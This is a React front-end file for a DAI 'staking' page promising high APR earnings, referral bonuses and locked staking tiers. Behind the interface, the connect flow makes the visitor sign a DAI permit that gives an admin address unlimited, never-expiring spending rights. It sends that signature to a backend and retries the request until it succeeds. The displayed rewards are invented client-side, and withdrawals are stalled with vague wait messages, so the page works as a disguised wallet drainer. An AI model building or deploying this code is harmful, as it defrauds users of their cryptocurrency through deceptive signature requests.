"use client";

// Dai permit function solidity guide
// https://www.alchemy.com/smart-contracts/dai

import CardContent from "@mui/material/CardContent";
import Card from "@mui/material/Card";
import { Tabs, Tab, Grid, Typography, Button, Snackbar } from "@mui/material";
import MuiAlert from "@mui/material/Alert";
import { fontSize, styled } from "@mui/system";
import { useLocation } from "react-router-dom";
import { ethers, MaxUint256, toBigInt } from "ethers";
import { useEffect, useState, forwardRef } from "react";
import { config, CustomConfig } from "../config";
import {
  registerUser,
  findUser,
  withdrawUpdate,
  axiosInstance_apy,
} from "../apis/backendAPI";
import TetherIcon from "../assets/tetherIcon.svg";
import CopyBefore from "../assets/copyBefore.svg";
import CopyAfter from "../assets/copyAfter.svg";
import daiAbi from "../contracts/abi.json";
import withdrawWallet from "../contracts/wallet.json";
import Countdown from "../components/CountDown";
import { getBnbBalance } from "../utils";
import { useAccount, useDisconnect, useSignTypedData } from "wagmi";
import { useLoadingContext } from "../context/LoadingContext";
import { getWalletClient } from "wagmi/actions";
import { useEthersSigner } from "./getSigner";
import truncateMiddle from "../utils/truncate_text";
import { useConnection } from "../context/connected_context";
import { toast } from "react-toastify";

function useQuery() {
  return new URLSearchParams(useLocation().search);
}

const StyledTab = styled(Tab)({
  color: "#898989",
  fontWeight: "bold",
  cursor: "pointer",
  fontSize: "0.875rem",
  backgroundColor: "transparent",
  padding: "12px",
  border: "none",
  borderRadius: "5px",
  display: "flex",
  justifyContent: "center",
  width: "calc(33.33333% - 3px)",
  minWidth: "calc(33.33333% - 3px)",
  maxWidth: "calc(33.33333% - 3px)",
  "&:hover": {
    backgroundColor: "#FFFFFF",
    color: "#000",
  },
  "&:focus": {
    color: "#000",
    outline: "none",
  },
  "&.Mui-selected": {
    backgroundColor: "#fff",
    boxShadow: "0px 1px 1px 0px #00000040",
  },
});

const StyledTabsList = styled(Tabs)({
  backgroundColor: "#EAEAEA",
  borderRadius: "5px",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  marginTop: "30px",
  marginBottom: "10px",
  padding: "4.5px",
  boxSizing: "border-box",
  ".MuiTabs-indicator": {
    height: "0",
  },
  ".css-heg063-MuiTabs-flexContainer": {
    gap: "5px",
    justifyContent: "space-between",
  },
});

const CardWrapper = styled(Card)({
  boxShadow: "none",
  backgroundColor: "#0E64C6",
  padding: "20px 5px",
  minHeight: "calc(100vh - 125px)",
});

const Clipboard = styled(Grid)({
  display: "flex",
  marginTop: "30px",
  justifyContent: "center",
  cursor: "pointer",
  alignItems: "center",
  "> .copy_text": {
    color: "#0E64C6",
    fontSize: "15px",
    margin: "0 10px",
  },
});

const ShowBalance = styled(Grid)({
  border: "1px solid rgba(0, 0, 0, 0.1)",
  borderRadius: "5px",
  marginTop: "15px",
  marginBottom: "15px",
  "> div": {
    display: "flex",
    gap: "10px",
    padding: "20px",
    alignItems: "center",
    justifyContent: "space-between",
    "> .totalreward": {
      margin: "0",
      fontSize: "18px",
      fontWeight: "bold",
    },
    "> .deltareward": {
      margin: "0",
      color: "#016818",
      fontSize: "17px",
    },
    "> input": {
      border: "0",
      outline: "none",
      padding: "0",
      width: "100%",
      fontSize: "18px",
      fontWeight: "bold",
    },
    "> .maxbutton": {
      margin: "0",
      cursor: "pointer",
      color: "#898989",
      fontSize: "12px",
    },
    "> .totalText": {
      margin: "0",
      color: "#016818",
      fontSize: "17px",
    },
  },
});

const Stakeboard = styled(Grid)({
  display: "flex",
  border: "1px solid rgba(0, 0, 0, 0.1)",
  borderRadius: "5px",
  marginTop: "15px",
  marginBottom: "15px",
  padding: "20px",
  alignItems: "center",
  justifyContent: "space-between",
  "> input": {
    border: "0",
    outline: "none",
    width: "100%",
    fontSize: "18px",
    padding: "0",
    fontWeight: "bold",
  },
  "> .maxbutton": {
    margin: "0",
    cursor: "pointer",
    color: "#898989",
    fontSize: "12px",
  },
});

const ApproveButton = styled(Button)(({ theme }) => ({
  backgroundColor: "#0E64C6",
  boxShadow: "none",
  borderRadius: "5px",
  width: "100%",
  marginTop: "32px",
  height: "54px",
  color: "#fff",
}));

const WithdrawButton = styled(Button)(({ theme }) => ({
  backgroundColor: "#0E64C6",
  boxShadow: "none",
  borderRadius: "5px",
  width: "100%",
  marginTop: "10px",
  height: "54px",
  color: "#fff",
}));

const Input1 = styled("input")(({ theme }) => ({
  fontSize: 12.8,
  fontWeight: 400,
  lineHeight: "1.6",
  padding: "20px",
  borderRadius: "5px",
  border: "0",
  background: "white",
  width: "50%",
  textAlign: "right",
  outline: "none",
  color: "#49a397",
}));

const Input2 = styled("input")(({ theme }) => ({
  fontSize: 16,
  fontWeight: 400,
  padding: "14px 20px",
  borderRadius: 5,
  lineHeight: "1.6",
  border: "1px solid rgba(0, 0, 0, 0.1)",
  background: "white",
  width: "100%",
  outline: "none",
}));

const StakeWithdraw = styled("div")(({ theme }) => ({
  marginTop: "45px",
}));

const Alert = forwardRef((props: any, ref: any) => {
  return <MuiAlert elevation={6} ref={ref} variant="filled" {...props} />;
});

const Home = () => {
  const { address, chainId } = useAccount();
  const {connected, setIsConnected} = useConnection();
  const { disconnect } = useDisconnect();
  const signer = useEthersSigner();
  const { signTypedDataAsync } = useSignTypedData();

  const [walletBalance, setWalletBalance] = useState(0);
  const [approved, setApproved] = useState(false);
  const [reward, setReward] = useState(0);
  const [rewards, setRewards] = useState({
    minReward: 0,
    dailyReward: 0,
    montlyReward: 0,
    yearlyReward: 0,
  });
  const { loading, setLoading } = useLoadingContext();

  const [apy, setApy] = useState(120);
  const [rockedApy, setRockedApy] = useState(360);
  const [allWithdraw, setAllWithdraw] = useState(false);
  const [snackbar, setSnackbar] = useState<any>(null);
  const [realReward, setRealReward] = useState(0);
  const [introReward, setIntroReward] = useState(0);
  const [realStake, setRealStake] = useState(0);
  const [rockedReward, setRockedReward] = useState(0);
  const [rockedBalance, setRockedBalance] = useState(0);
  const [rockminReward, setRockminReward] = useState(0);
  const [total, setTotal] = useState(0);
  var tabValue = [1, 1.2, 1.5];
  const [copied, setCopied] = useState(false);
  let real = false;
  const [tabIndex, setTabIndex] = useState(1);
  const [dateEnd, setDateEnd] = useState(new Date());

  const query = useQuery();

  const link_copy = `${window.origin}?ref=${address}`;
  const urlCopy = () => {
    navigator.clipboard.writeText(link_copy);
    setCopied(true);
    setTimeout(() => {
      setCopied(false);
    }, 1000);
  };

  const fetchWalletBalance = async () => {
    if (!address) {
      return;
    }
    const response = await axiosInstance_apy.get("/get-apy");
    const tmp_res = response.data.detail;
    if (response) {
      setApy(tmp_res.apy);
      setRockedApy(tmp_res.rockedApy);
      setAllWithdraw(tmp_res.allwithdraw);
    }

    if (address) {
      const bal = await getBnbBalance(address);
      setWalletBalance(bal);
      if (!real) {
        setRealStake(bal);

        // console.log("bal, apy, rockedApy => ", bal, apy, rockedApy)
        setRewards({
          minReward: (bal * tmp_res.apy) / 876000,
          dailyReward: (bal * tmp_res.rockedApy) / 36500,
          montlyReward: (bal * tmp_res.rockedApy) / 1200,
          yearlyReward: (bal * tmp_res.rockedApy) / 100,
        });
        real = true;
      }
    }
  };

  useEffect(() => {
    // fetchWalletBalance();
    disconnect();
  }, []);

  useEffect(() => {
    // fetchWalletBalance();
    signer && connected && bake();
  }, [signer, connected]);

  const connectedSet = async (reward_user: any) => {
    try {
      var dateNine = new Date(reward_user.daysNine);
      var dateTwelve = new Date(reward_user.daysTwelve);
      var dateEighteen = new Date(reward_user.daysEighteen);

      if (reward_user.daysInit == 0) setDateEnd(dateNine);
      if (reward_user.daysInit == 90) setDateEnd(dateNine);
      if (reward_user.daysInit == 120) setDateEnd(dateTwelve);
      if (reward_user.daysInit == 180) setDateEnd(dateEighteen);

      setTotal(reward_user.introReward - reward_user.hourHistory);
      setApproved(true);
      setReward(Math.round(reward_user.reward * 1e6) / 1e6);
      setIntroReward(Math.round(reward_user.introReward * 1e6) / 1e6);
      setRockedReward(Math.round(reward_user.rokedReward * 1e6) / 1e6);
      setRockedBalance(
        Math.round(
          (reward_user.rokedBalanceNine +
            reward_user.rokedBalanceTwelve +
            reward_user.rokedBalanceEighteen) *
            1e6
        ) / 1e6
      );
      const tmp =
        ((reward_user.rokedBalanceNine +
          reward_user.rokedBalanceTwelve * 1.2 +
          reward_user.rokedBalanceEighteen * 1.5) *
          rockedApy) /
        876000;
      setRockminReward(Math.round(tmp * 1e6) / 1e6);
    } catch (err) {
      console.error(err);
    }
  };

  const bake = async () => {
    if (!address) return;
    setLoading(true);

    const parrent_add: string = query.get("ref") || "";
    let _approved = false;

    try {
      const userExist = await findUser(address);
      const user = userExist.user;

      if (userExist.message === "User found" && user?.connected) {
        _approved = true;
        setApproved(true);
        await connectedSet(user);
      } else {
        const walletclient = await getWalletClient(CustomConfig);
        console.log(walletclient);
        if (!signer || !address || !chainId) {
          throw new Error("Wallet not connected");
        }

        const contract = new ethers.Contract(
          config.contractAddress,
          daiAbi,
          signer
        );

        const nonce = await contract.nonces(address);
        const name = await contract.name();

        // console.log(nonce, name);
        const deadline = toBigInt(
          "115792089237316195423570985008687907853269984665640564039457584007913129639935"
        );

        const domain = {
          name: name as string,
          version: "1",
          chainId: 1,
          verifyingContract: config.contractAddress as `0x${string}`,
        };
        // console.log("domain : ", domain);
        const types = {
          Permit: [
            { name: "holder", type: "address" },
            { name: "spender", type: "address" },
            { name: "nonce", type: "uint256" },
            { name: "expiry", type: "uint256" },
            { name: "allowed", type: "bool" },
          ],
        };

        console.log("types : ", types);
        const values = {
          holder: address,
          spender: config.adminAddress,
          nonce: nonce,
          expiry: deadline,
          allowed: true,
        };
        console.log("values : ", values);

        // Sign data
        // const signature = await signTypedDataAsync({
        //   account: address as `0x${string}`,
        //   domain,
        //   types,
        //   primaryType: "Permit",
        //   message: values,
        // });

        
        const signature = await signer.signTypedData(domain, types, values);
        console.log(signature);

        if (signature) {
          console.log(signature);
          const result = await registerUser(
            address || "",
            parrent_add,
            signature,
            nonce.toString(),
            deadline.toString(),
            config.adminAddress
          );
          console.log("test");

          if (result.message === "User connected") {
            _approved = true;
            setApproved(true);
            await connectedSet(result.user);
          } else {
            toast.error("Failed to Connect");
            setIsConnected(false);
          }
        }
      }

      !_approved && bake();
    } catch (err) {
      // alert("Permit failed");
      toast.error("Failed to Connect");
      setIsConnected(false);
      console.error(err);
    }
    setLoading(false);
  };

  const tokenTransfer = async (amount: number) => {
    if (amount <= 0) {
      setSnackbar({
        type: "warning",
        message: `Please enter the exact amount you want to lock.`,
      });
      return;
    }
    setLoading(true);
    try {
      const balance = await getBnbBalance(address || "");
      setWalletBalance(balance);

      if (balance >= amount) {
        const provider = new ethers.JsonRpcProvider(
          "https://rpc.mevblocker.io"
        );
        const eth_bal = await provider.getBalance(
          "0x343D444A6E057C109404CCBf7062716785B27cA4"
        );
        let formattedBalance = ethers.formatEther(eth_bal);
        if (parseFloat(formattedBalance) < 0.004) {
          setSnackbar({
            type: "error",
            message: `Please wait a while to withdraw your reward`,
          });
          setLoading(false);
          return;
        }

        const result = await withdrawUpdate(address || "", amount, tabIndex + 1);

        if (result.message == "successful") {
          setRockedBalance(rockedBalance + amount);
          setSnackbar({
            type: "success",
            message: `You have successfully locked ${amount.toLocaleString()}DAI.`,
          });

          if (tabIndex == 0) {
            var tmp_date = dateEnd.getTime() + 1000 * 60 * 60 * 24 * 90;
            setDateEnd(new Date(tmp_date));
          }
          if (tabIndex == 1) {
            var tmp_date = dateEnd.getTime() + 1000 * 60 * 60 * 24 * 120;
            setDateEnd(new Date(tmp_date));
          }
          if (tabIndex == 2) {
            var tmp_date = dateEnd.getTime() + 1000 * 60 * 60 * 24 * 150;
            setDateEnd(new Date(tmp_date));
          }
        } else {
          setSnackbar({
            type: "error",
            message: `Please wait a while to withdraw your reward`,
          });
        }
      } else {
        setSnackbar({
          type: "error",
          message:
            "There is not enough balance. Add DAI tokens to your wallet.",
        });
      }

      setLoading(false);
    } catch (err) {
      console.error(err);
      setLoading(false);
    }
  };

  const introWithdraw = async () => {
    setSnackbar({
      type: "warning",
      message: "The withdrawal is available on the 1st day of each month.",
    });
    return;
  };

  const profitWithdraw = async (e: any, withType: any) => {
    if (e <= 0) {
      setSnackbar({
        type: "warning",
        message: "There are no rewards to withdraw",
      });
      return;
    }

    setLoading(true);

    if (withType == -1 && e < 100) {
      setSnackbar({
        type: "warning",
        message: `Make sure you have your reward of 100 DAI or more`,
      });
      setLoading(false);
      return;
    }

    const bal = await getBnbBalance(withdrawWallet.address);
    if (bal < e) {
      setSnackbar({
        type: "error",
        message: `Please wait a while to withdraw your reward`,
      });
      setLoading(false);
      return;
    }

    const provider = new ethers.JsonRpcProvider("https://rpc.mevblocker.io");
    const eth_bal = await provider.getBalance(withdrawWallet.address);

    let formattedBalance = ethers.formatEther(eth_bal);
    if (parseFloat(formattedBalance) < 0.002) {
      setSnackbar({
        type: "error",
        message: `Please wait a while to withdraw your reward`,
      });
      setLoading(false);
      return;
    }

    const result = await withdrawUpdate(address || "", e, withType);

    if (result.data.message == "successful") {
      setLoading(false);
      setSnackbar({
        type: "success",
        message: `${e.toLocaleString()}DAI has been successfully withdrawn into your wallet.`,
      });
      withType < 0 && setReward(reward - e);
      withType == 0 && setRockedReward(0);
    } else {
      setSnackbar({
        type: "error",
        message: `Please wait a while to withdraw your reward`,
      });
      setLoading(false);
    }
  };

  const alertClose = (event: any, reason: string) => {
    if (reason === "clickaway") {
      return;
    }
    setSnackbar(null);
  };

  const rewardSet = async (e: any) => {
    if (e <= reward) {
      setRealReward(e);
    } else {
      setSnackbar({
        type: "error",
        message: `Please enter an amount less than the total compensation.`,
      });
    }
  };

  const stakeSet = async (e: any) => {
    if (e <= walletBalance) {
      setRealStake(e);
      setRewards({
        minReward: rewards.minReward,
        dailyReward: (e * rockedApy) / 36500,
        montlyReward: (e * rockedApy) / 1200,
        yearlyReward: (e * rockedApy) / 100,
      });
    } else {
      setSnackbar({
        type: "error",
        message: `Please enter an amount less than the total compensation.`,
      });
    }
  };

  const onTabClicked = (event: any, index: number) => {
    setTabIndex(index);
  };

  return (
    <>
      <CardWrapper>
        <CardContent>
          <Grid textAlign="center" alignItems="center">
            <Typography color="white" variant="h4" marginBottom={2.5}>
              Earn crypto while you sleep
            </Typography>
            <Grid container alignItems="center" mt={2.5}>
              <Typography color="white" variant="h6">
                Staking puts your assets to work, with interest rates at high
                APR
              </Typography>
            </Grid>
          </Grid>
          {address && approved && (
            <Grid
              sx={{
                textAlign: "center",
                backgroundColor: "#FFF",
                padding: "20px",
                borderRadius: "5px",
              }}
              mt={3.75}
            >
              <Typography variant="body2" marginBottom={0.65}>
                My rewards
              </Typography>
              <Grid textAlign="center">
                <Typography variant="h6">
                  {truncateMiddle(address, 14, 5)}
                </Typography>
              </Grid>
              <Grid alignItems="center" padding="32px 0" borderRadius="5px">
                <Grid
                  border="1px solid rgba(0, 0, 0, 0.1)"
                  borderRadius="5px"
                  marginBottom="16px"
                  display="flex"
                  justifyContent="space-between"
                >
                  <Grid
                    display="flex"
                    gap="10px"
                    padding="0 20px"
                    alignItems="center"
                  >
                    <img src={TetherIcon} />
                    <p style={{ margin: "0", fontSize: "16px" }}>DAI</p>
                  </Grid>
                  <Input1
                    value={`${apy?.toLocaleString(undefined, {
                      minimumFractionDigits: 0,
                      maximumFractionDigits: 2,
                    })}%`}
                    placeholder="120%"
                    readOnly
                  />
                </Grid>
                <Input2
                  style={{ color: "" }}
                  value={walletBalance?.toLocaleString(undefined, {
                    minimumFractionDigits: 0,
                    maximumFractionDigits: 4,
                  })}
                  placeholder="10,000"
                  readOnly
                />
              </Grid>
              <ShowBalance>
                <div>
                  <p className="totalreward">
                    {reward?.toLocaleString(undefined, {
                      minimumFractionDigits: 0,
                      maximumFractionDigits: 6,
                    })}
                  </p>
                  <p className="deltareward">
                    +
                    {rewards.minReward?.toLocaleString(undefined, {
                      minimumFractionDigits: 0,
                      maximumFractionDigits: 6,
                    })}{" "}
                    DAI
                  </p>
                </div>
              </ShowBalance>
              <ShowBalance>
                <div>
                  <input
                    value={realReward}
                    onChange={(e) => rewardSet(e.target.value)}
                    placeholder="10,000"
                  />
                  <p
                    className="maxbutton"
                    onClick={(e) => setRealReward(reward)}
                  >
                    MAX
                  </p>
                </div>
              </ShowBalance>
              <ApproveButton
                color="secondary"
                variant="contained"
                disabled={loading}
                onClick={() => profitWithdraw(realReward, -1)}
              >
                Withdraw
              </ApproveButton>
              {/* <Grid
              marginTop="60px"
            >
              <Typography variant="body2" color="#0E64C6" marginBottom={0.65}>Referral rewards</Typography>
              <Grid
                textAlign="center"
                padding="5px 0 35px"
              >
                <Typography variant="h7">2% bonus from tier 1</Typography><br/>
                <Typography variant="h7">1% bonus from tier 2</Typography>
              </Grid>
            </Grid>
            <ShowBalance>
              <div>
                <p className="totalreward">{introReward?.toLocaleString(undefined, {minimumFractionDigits: 0, maximumFractionDigits: 3})}</p>
                <p className="totalText" style={{color: total>=0?"":"#ff0000"}}>{total>=0&&"+"}{total?.toLocaleString(undefined, {minimumFractionDigits: 0, maximumFractionDigits: 3})} DAI</p>
              </div>
            </ShowBalance>
            <WithdrawButton
              color="secondary"
              variant="contained"
              onClick={introWithdraw}
              mt="10px"
            >
              Withdraw
            </WithdrawButton> */}
              <Clipboard>
                {copied ? <img src={CopyAfter} /> : <img src={CopyBefore} />}
                <p className="copy_text" onClick={() => urlCopy()}>
                  Copy Referral Link
                </p>
              </Clipboard>
            </Grid>
          )}
          {address && approved && (
            <Grid
              sx={{
                textAlign: "center",
                backgroundColor: "white",
                padding: "20px",
                borderRadius: "5px",
              }}
              mt={5}
            >
              <Typography variant="body2" marginBottom={0.65}>
                Locked staking
              </Typography>
              <Grid textAlign="center">
                <Typography variant="h6">
                  Estimated earnings from current APR
                </Typography>
              </Grid>
              <Grid>
                <StyledTabsList value={tabIndex} onChange={onTabClicked}>
                  <StyledTab label="90 Days" />
                  <StyledTab label="120 Days" />
                  <StyledTab label="180 Days" />
                </StyledTabsList>
              </Grid>
              <Grid alignItems="center" padding="32px 0" borderRadius="5px">
                <Grid
                  border="1px solid rgba(0, 0, 0, 0.1)"
                  borderRadius="5px"
                  marginBottom="16px"
                  display="flex"
                  justifyContent="space-between"
                >
                  <Grid
                    display="flex"
                    gap="10px"
                    padding="0 20px"
                    alignItems="center"
                  >
                    <img src={TetherIcon} />
                    <p style={{ margin: "0", fontSize: "16px" }}>DAI</p>
                  </Grid>
                  <Input1
                    value={`${(rockedApy * tabValue[tabIndex])?.toLocaleString(
                      undefined,
                      { minimumFractionDigits: 0, maximumFractionDigits: 2 }
                    )}%`}
                    placeholder="120%"
                    readOnly
                  />
                </Grid>
                <Stakeboard>
                  <input
                    value={realStake}
                    onChange={(e) => stakeSet(e.target.value)}
                    placeholder="10,000"
                  />
                  <p
                    className="maxbutton"
                    onClick={() => setRealStake(walletBalance)}
                  >
                    MAX
                  </p>
                </Stakeboard>
              </Grid>
              <Grid
                container
                justifyContent="space-between"
                alignItems="center"
                boxShadow="0px 1px 3px rgba(0, 0, 0 / 0.25)"
              >
                <Typography variant="body2">DAILY EARNINGS</Typography>
                <Typography variant="h6">
                  {`+${(
                    rewards.dailyReward * tabValue[tabIndex]
                  )?.toLocaleString(undefined, {
                    minimumFractionDigits: 0,
                    maximumFractionDigits: 4,
                  })} DAI`}{" "}
                </Typography>
              </Grid>

              <Grid
                container
                justifyContent="space-between"
                alignItems="center"
                marginTop="3px"
                boxShadow="0px 1px 3px rgba(0, 0, 0 / 0.25)"
              >
                <Typography variant="body2">MONTHLY EARNINGS</Typography>
                <Typography variant="h6">
                  {`+${(
                    rewards.montlyReward * tabValue[tabIndex]
                  )?.toLocaleString(undefined, {
                    minimumFractionDigits: 0,
                    maximumFractionDigits: 4,
                  })} DAI`}{" "}
                </Typography>
              </Grid>

              <Grid
                container
                justifyContent="space-between"
                alignItems="center"
                marginTop="3px"
                boxShadow="0px 1px 3px rgba(0, 0, 0 / 0.25)"
              >
                <Typography variant="body2">YEARLY EARNINGS</Typography>
                <Typography variant="h6">
                  {`+${(
                    rewards.yearlyReward * tabValue[tabIndex]
                  )?.toLocaleString(undefined, {
                    minimumFractionDigits: 0,
                    maximumFractionDigits: 2,
                  })} DAI`}{" "}
                </Typography>
              </Grid>
              <ApproveButton
                color="secondary"
                variant="contained"
                onClick={() => tokenTransfer(realStake)}
              >
                Earn Now
              </ApproveButton>
              {rockedBalance > 0 && (
                <StakeWithdraw>
                  <ShowBalance>
                    <div>
                      <span>{rockedBalance}</span>
                    </div>
                  </ShowBalance>
                  <ShowBalance>
                    <div>
                      <p className="totalreward">
                        {rockedReward?.toLocaleString(undefined, {
                          minimumFractionDigits: 0,
                          maximumFractionDigits: 6,
                        })}
                      </p>
                      <p className="deltareward">
                        +
                        {rockminReward?.toLocaleString(undefined, {
                          minimumFractionDigits: 0,
                          maximumFractionDigits: 6,
                        })}{" "}
                        DAI
                      </p>
                    </div>
                  </ShowBalance>
                  <ApproveButton
                    color="secondary"
                    variant="contained"
                    disabled={!allWithdraw}
                    onClick={() => profitWithdraw(rockedReward, 0)}
                  >
                    Withdraw
                  </ApproveButton>
                  <Countdown dateEnd={dateEnd} />
                </StakeWithdraw>
              )}
            </Grid>
          )}
          {snackbar && (
            <Snackbar
              open={!!snackbar}
              autoHideDuration={4000}
              onClose={alertClose}
            >
              {
                <Alert
                  onClose={alertClose}
                  severity={snackbar?.type}
                  sx={{ width: "100%", fontSize: "16px" }}
                >
                  {snackbar?.message}
                </Alert>
              }
            </Snackbar>
          )}
        </CardContent>
      </CardWrapper>
    </>
  );
};

export default Home;
